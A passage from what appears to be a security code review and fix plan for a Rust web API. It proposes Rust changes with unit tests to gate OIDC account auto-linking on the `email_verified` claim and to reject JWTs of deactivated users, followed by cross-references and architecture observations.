- `crates/ui/web-api/src/routes/device_auth.rs` — add permission check to approval handler

**Testing:**
- Unit test: 6th approval request within 60 seconds returns 429
- Unit test: unauthenticated approval returns 401
- Unit test: authenticated user without permission returns 403

---

### FP-ME2: Check email_verified before OIDC auto-link (TOP 5 — #14)

**Addresses:** ME-2 (Medium — account takeover via unverified email)

**Problem:** The `resolve_oidc_user()` function in `web-api/src/auth/authentication.rs:82-210` auto-links an OIDC identity to an existing user based solely on email match. The `email_verified` claim from the OIDC provider is never checked. If an OIDC provider doesn't verify email addresses (or an attacker controls a provider), they can claim any email and hijack the corresponding account.

**Current auto-link decision flow (`authentication.rs:115-159`):**
```rust
// Check for existing user by email
if let Some(found_user) = User::find()
    .filter(user::Column::Email.eq(email))
    .one(db).await?
{
    if !found_user.is_active { return Ok(Deactivated); }
    // Check for existing OIDC links...
    if has_other_oidc_link { return Ok(LinkViaOidcRequired { ... }); }
    // Check for password...
    if found_user.password_hash.is_some() { return Ok(LinkViaPasswordRequired { ... }); }
    // ❌ Auto-link WITHOUT checking email_verified
    return Ok(AutoLink { user_id: found_user.id });
}
```

**Available but unused data:** The `openidconnect` crate's `StandardClaims` provides `email_verified()` which returns `Option<bool>`. The callback handler in `oidc_auth.rs` already extracts `claims.email()` but never calls `claims.email_verified()`.

**Detailed implementation plan:**

1. **Add `email_verified` to `OidcUserParams`:**
   ```rust
   pub struct OidcUserParams<'a> {
       pub db: &'a DatabaseConnection,
       pub tenant_id: Uuid,
       pub provider_id: Uuid,
       pub oidc_subject: &'a str,
       pub email: &'a str,
       pub first_name: Option<&'a str>,
       pub last_name: Option<&'a str>,
       pub auto_create: bool,
       pub email_verified: Option<bool>,  // ← ADD
   }
   ```

2. **Extract `email_verified` in the OIDC callback handler** (`oidc_auth.rs`, around lines 292-344):
   ```rust
   let email_verified = claims.email_verified();
   ```
   Pass it through to `resolve_oidc_user()` via `OidcUserParams`.

3. **Gate auto-link on verified email** (`authentication.rs`, around line 156):
   ```rust
   // Only auto-link if the OIDC provider asserts the email is verified
   if params.email_verified == Some(true) {
       return Ok(OidcUserResolution::AutoLink { user_id: found_user.id });
   }

   // Email not verified (false or absent) — require explicit linking
   if found_user.password_hash.is_some() {
       return Ok(OidcUserResolution::LinkViaPasswordRequired {
           user_id: found_user.id,
       });
   }

   // No password and unverified email — cannot auto-link safely
   // Return a new resolution variant that tells the UI to prompt manual verification
   return Ok(OidcUserResolution::LinkViaPasswordRequired {
       user_id: found_user.id,
   });
   ```

4. **Log when auto-link is blocked for unverified email** (defense observability):
   ```rust
   tracing::info!(
       email = %params.email,
       provider_id = %params.provider_id,
       email_verified = ?params.email_verified,
       "OIDC auto-link blocked: email not verified by provider"
   );
   ```

5. **Consider a per-provider trust setting** (optional, future enhancement):
   Some internal IdPs (e.g., Keycloak, Authentik) are trusted to always verify emails. Add an optional `trust_email_without_verification: bool` flag to the `oidc_providers` table/config. When `true`, auto-link proceeds regardless of the `email_verified` claim.

**Files to modify:**
- `crates/ui/web-api/src/auth/authentication.rs` — add `email_verified` param, gate auto-link
- `crates/ui/web-api/src/routes/oidc_auth.rs` — extract `email_verified` from claims, pass to resolver

**Testing:**
- Unit test: `email_verified = Some(true)` → auto-link succeeds
- Unit test: `email_verified = Some(false)` → auto-link blocked, returns `LinkViaPasswordRequired`
- Unit test: `email_verified = None` → auto-link blocked (absent is untrusted)
- Unit test: new user creation still works regardless of `email_verified` (only affects auto-link)

---

### FP-ME6: Check user active status on JWT-authenticated requests (TOP 5 — #15)

**Addresses:** ME-6 (Medium — deactivated user access for up to 15 minutes)

**Problem:** The `authenticate_jwt()` function in `web-api/src/middleware/require_auth.rs:125-156` is completely stateless — it decodes the JWT, extracts claims, and returns `AuthenticatedUser` without any database query. When an admin deactivates a user, the user's existing JWT tokens remain valid for their remaining lifetime (up to 15 minutes). In contrast, the `authenticate_api_token()` path correctly checks `is_active` on every request.

**Current JWT path (`require_auth.rs:125-156`):**
```rust
fn authenticate_jwt(                    // ← synchronous, no DB access
    state: &AppState,
    token: &str,
) -> std::result::Result<AuthenticatedUser, AuthFailure> {
    let claims = state.jwt.decode_access_token(token)?;
    let user_id = uuid::Uuid::parse_str(&claims.sub)?;
    // ... extract auth_method from claims ...
    // ❌ NO DATABASE CHECK — returns directly from JWT claims
    Ok(AuthenticatedUser {
        user_id,
        auth_method,
        permissions: claims.permissions,
    })
}
```

**Current API token path (for comparison, `require_auth.rs:91-123`):**
```rust
async fn authenticate_api_token(state: &AppState, token: &str) -> Result<...> {
    let (user_id, _) = service.verify_token(token).await?;
    let user = User::find_by_id(user_id).one(&state.db).await?;
    if !user.is_active {                // ✅ checks active status
        return Err(AuthFailure::Forbidden("User is deactivated\n"));
    }
    // ...
}
```

**Detailed implementation plan:**

1. **Convert `authenticate_jwt` to async and add DB check:**
   ```rust
   async fn authenticate_jwt(
       state: &AppState,
       token: &str,
   ) -> std::result::Result<AuthenticatedUser, AuthFailure> {
       let claims = state
           .jwt
           .decode_access_token(token)
           .map_err(|_| AuthFailure::Unauthorized("Invalid or expired token\n"))?;

       let user_id = uuid::Uuid::parse_str(&claims.sub)
           .map_err(|_| AuthFailure::Unauthorized("Invalid token subject\n"))?;

       // Check user is active (matches API token behavior)
       let user = User::find_by_id(user_id)
           .one(&state.db)
           .await
           .map_err(|_| AuthFailure::InternalError)?
           .ok_or(AuthFailure::Unauthorized("User not found\n"))?;

       if !user.is_active {
           return Err(AuthFailure::Forbidden("User is deactivated\n"));
       }

       let auth_method = /* ... existing auth_method extraction ... */;

       Ok(AuthenticatedUser {
           user_id,
           auth_method,
           permissions: claims.permissions,
       })
   }
   ```

2. **Update the call site in `require_auth` middleware** (around line 58):
   ```rust
   // Before:
   match authenticate_jwt(&state, &token) {
   // After:
   match authenticate_jwt(&state, &token).await {
   ```

3. **Performance consideration:** This adds one `SELECT users WHERE id = ?` query per JWT-authenticated request. This is a primary key lookup (indexed, sub-millisecond on SQLite/PostgreSQL). Given that the API token path already performs this check on every request, consistency is more important than the minor performance cost.

4. **Alternative (deferred, if performance becomes an issue):** Add an in-memory `deactivated_users: DashSet<Uuid>` cache to `AppState`, populated on user deactivation, checked on JWT auth. This avoids the DB query but adds complexity. Not recommended unless profiling shows the DB check is a bottleneck.

**Files to modify:**
- `crates/ui/web-api/src/middleware/require_auth.rs` — make `authenticate_jwt` async, add DB check

**Testing:**
- Unit test: deactivated user's JWT is rejected with 403
- Unit test: active user's JWT still works
- Unit test: deleted user (not in DB) returns 401
- Integration test: deactivate user → immediate JWT rejection (no 15-minute delay)

---

## Cross-References to Wire Protocol CODEREVIEW

The following findings from `crates/shared/wire/CODEREVIEW.md` are confirmed and not duplicated here:

| Wire ID | This Review | Status |
|---------|-------------|--------|
| A1 (MQTT password in outbox) | CR-2 | Extended to cover at-rest encryption |
| S1 (Argon2 brute-force) | — | Confirmed, fix in wire FP-1 |
| S2 (Anonymous timeout) | HI-5 | Extended with connection cap |
| S4 (Unbounded output) | HI-3 | Extended with ownership validation |
| H2 (Cursor advancement) | HI-7 | Confirmed, fix in wire FP-3 |
| H5 (Lease TOCTOU) | HI-6 | Confirmed, fix in wire FP-8 |
| D1 (Connection dedup) | — | Confirmed, fix in wire FP-16 |
| D2 (Update ownership) | HI-3 | Confirmed, fix in wire FP-17 |
| D3 (Register order) | — | Confirmed, fix in wire FP-18 |
| D4 (Broadcast lock) | — | Confirmed, fix in wire FP-19 |
| D5 (Approval timeout) | — | Confirmed, fix in wire FP-20 |

---

## Architecture Observations

### Strengths

1. **HA readiness is strong.** CA rotation CAS, version-gated CRL polling, settings version checking, and the notification outbox all demonstrate thoughtful multi-instance design. The database is correctly treated as the single source of truth.

2. **Clean separation of concerns.** The controller (orchestration), web-api (routes/middleware), wire (protocol), enrollment (shared identity), and db (entities) crates have clear boundaries.

3. **Comprehensive test infrastructure.** Docker-based reverse proxy integration tests covering Nginx, Traefik, Caddy, HAProxy, and Envoy with real mTLS, CRL, and OCSP scenarios.

4. **Zero-downtime restart.** The `SO_REUSEPORT` + `SIGUSR1` takeover mechanism with scattered restart notifications is well-engineered.

### Areas for Improvement

1. **Key material surface area.** `CaSnapshotData` conflates metadata with secrets. Split recommended (FP-CR3).

2. **main.rs monolith.** The `run()` function is 1100+ lines. Extract into `init_pki()`, `init_oidc()`, `start_background_tasks()`, `graceful_shutdown()`.

3. **Multi-tenancy readiness.** Several tables lack `tenant_id` (`users`, `sessions`, `roles`, `permissions`), and junction tables (`service_hosts`, `host_software_items`) have no cross-tenant protection. The current single-tenant mode masks these gaps.

4. **Missing observability.** No request ID correlation, no distributed tracing, no metrics endpoint.

5. **Inconsistent shutdown.** The CRL manager is `abort()`-ed while all other tasks use `CancellationToken`. The PKI HTTP server has no graceful shutdown.
